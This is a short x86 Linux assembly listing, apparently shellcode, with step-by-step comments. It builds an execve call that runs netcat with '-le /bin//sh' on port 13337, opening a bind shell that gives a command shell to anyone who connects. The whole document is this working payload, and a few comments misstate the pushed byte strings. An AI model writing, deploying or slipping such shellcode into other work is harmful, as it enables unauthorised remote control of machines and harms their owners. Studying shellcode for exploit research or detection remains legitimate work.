global _start

section .text

_start:

xor    eax,eax				;zero out eax register
push   eax				; push null on to the stack
push   0x37333333			; push 7333 onto the stack
push   0x3170762d			; push  1pv-   onto  the stack
mov    esi,esp				; pointer to arg is moved to esi  register
push   eax				; push null on to the stack
push   0x68732f2f			; push  hs// on to the stack
push   0x6e69622f			; push  nib/  onto the stack
push   0x2f656c2d			; push  /el- on to the stack
mov    edi,esp				; pointer to arg is moved to edi register
push   eax				; push null onto the stack
push   0x636e2f2f			; push cn// onto the stack
push   0x6e69622f			; push nib/  onto the stack
mov    ebx,esp				; pointer to arg is placed in ebx register
push   eax				; push null on to the stack
push   esi				; pointer to arg (-vp13337) is pushed onto stack
push   edi				; pointer to arg ( /bin//sh) is pushed onto stack
push   ebx				; pointer to arg  (/bin//cn) is pushed onto stack
mov    ecx,esp			     	; pointer to arg where esp is pointing to(top of the stack) is placed in ecx regsiter
mov    al,0xb				; move 11 to al register(execve sys call number)
int    0x80		                             ; sys call invoked  execve("/bin//nc", ["/bin//nc", "-le//bin//sh", "-vp13337"]
